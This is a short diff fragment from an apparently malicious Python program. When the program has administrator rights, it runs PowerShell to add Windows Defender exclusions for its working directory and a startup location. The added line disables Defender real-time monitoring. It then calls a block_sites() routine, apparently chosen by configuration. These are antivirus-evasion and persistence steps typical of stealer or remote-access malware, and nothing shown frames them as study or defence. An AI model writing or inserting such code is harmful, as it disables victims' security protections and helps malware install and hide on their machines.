@@ -3216,6 +3216,7 @@ if IsAdmin():
             shell=True)
         subprocess.run("powershell -Command \"Add-MpPreference -ExclusionPath '{}','{}'\"".format(working_dir, startup_loc),
                        shell=True)
+        subprocess.run('powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"', shell=True)
     if cc.get_block_sites():
         block_sites()
 
